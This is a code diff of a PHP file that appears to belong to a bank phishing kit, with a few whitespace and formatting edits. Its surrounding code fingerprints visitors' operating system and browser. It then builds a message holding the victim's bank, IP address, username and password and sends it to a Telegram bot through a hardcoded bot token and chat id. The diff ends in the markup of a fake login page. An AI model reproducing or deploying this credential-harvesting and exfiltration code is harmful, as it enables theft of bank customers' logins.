@@ -37,11 +37,6 @@ if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
     echo $response;
     exit;
 }
-
-
-
-
-
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
@@ -127,8 +122,6 @@ function getBrowser() {
 
     return $browser;
 }
-
-
 $user_os        = getOS();
 $user_browser   = getBrowser();
  
@@ -198,9 +191,7 @@ if ($success==false) {
     fclose($fp);
 }
 
-
-
-$message =" $bank$lh$ip\n\n-----------------\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";
+$message =" $bank$lh$ip\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
     'chat_id' => '-821080105',
@@ -5438,9 +5429,7 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
             padding-bottom: 0
         }
     </style>
-
-
-</head>
+    </head>
 
 <body>
     <div class="root" id="root">
